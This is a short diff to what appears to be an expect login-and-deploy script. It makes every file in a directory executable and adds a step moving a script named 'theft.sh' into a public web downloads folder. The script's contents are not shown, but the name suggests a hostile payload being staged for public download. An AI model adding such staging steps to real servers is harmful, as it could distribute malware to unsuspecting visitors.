@@ -34,7 +34,10 @@ expect " password: "
 send "$controller_pass\r"
 
 expect "*:~# "
-send "chmod +x $path/*.py \r"
+send "chmod +x $path/* \r"
+
+expect "*:~# "
+send "mv $path/theft.sh /var/www/html/downloads\r"
 
 expect "*:~# "
 send "exit\r"
